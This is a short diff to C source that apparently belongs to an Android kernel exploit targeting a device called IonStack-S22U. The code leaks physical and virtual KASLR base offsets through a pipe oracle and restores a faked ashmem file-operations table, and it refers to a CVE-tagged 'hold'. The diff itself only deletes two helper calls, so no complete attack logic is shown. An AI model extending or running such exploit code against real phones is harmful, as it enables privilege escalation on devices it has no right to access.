@@ -1275,8 +1275,6 @@ static int slide_leak_physical_base(void) {
     /* v0.3.27 (deferred — IonStack-S22U README.md:59): mark gate hit so main.c
      * invokes repair_fake_fops_llseek(fd) where fd is in scope. */
     {
-      extern void mark_gate_hit_for_immediate_fops_restore(void);
-      mark_gate_hit_for_immediate_fops_restore();
       pr_info("gate_hit marked for ashmem_fops deferred restore\n");
     }
     if (gate_result < 0) {
@@ -1290,8 +1288,6 @@ static int slide_leak_physical_base(void) {
     }
     /* v0.3.27 (deferred — IonStack-S22U spawn_allocation_keeper) */
     {
-      extern void note_fork_cve43499_hold(int gate_idx);
-      note_fork_cve43499_hold(P0_ORACLE_GATE_OBJECT_INDEX);
       pr_info("cve43499-hold will spawn from main.c after gate_hit\n");
     }
     uintptr_t offset = scan_p0_pipe_oracle();
@@ -1356,8 +1352,6 @@ static int slide_leak_physical_base(void) {
     /* v0.3.27 (deferred — IonStack-S22U README.md:59): mark gate hit so main.c
      * invokes repair_fake_fops_llseek(fd) where fd is in scope. */
     {
-      extern void mark_gate_hit_for_immediate_fops_restore(void);
-      mark_gate_hit_for_immediate_fops_restore();
       pr_info("gate_hit marked for ashmem_fops deferred restore\n");
     }
   if (gate_result < 0) {
@@ -1371,8 +1365,6 @@ static int slide_leak_physical_base(void) {
   }
   /* v0.3.27 (deferred — IonStack-S22U spawn_allocation_keeper) */
     {
-      extern void note_fork_cve43499_hold(int gate_idx);
-      note_fork_cve43499_hold(P0_ORACLE_GATE_OBJECT_INDEX);
       pr_info("cve43499-hold will spawn from main.c after gate_hit\n");
     }
     uintptr_t offset = scan_p0_pipe_oracle();
@@ -1413,8 +1405,6 @@ static int slide_leak_virtual_base(uintptr_t physical_offset) {
     /* v0.3.27 (deferred — IonStack-S22U README.md:59): mark gate hit so main.c
      * invokes repair_fake_fops_llseek(fd) where fd is in scope. */
     {
-      extern void mark_gate_hit_for_immediate_fops_restore(void);
-      mark_gate_hit_for_immediate_fops_restore();
       pr_info("gate_hit marked for ashmem_fops deferred restore\n");
     }
   if (!slide_trigger_physical_slot(P0_ORACLE_GATE_SLOT)) {
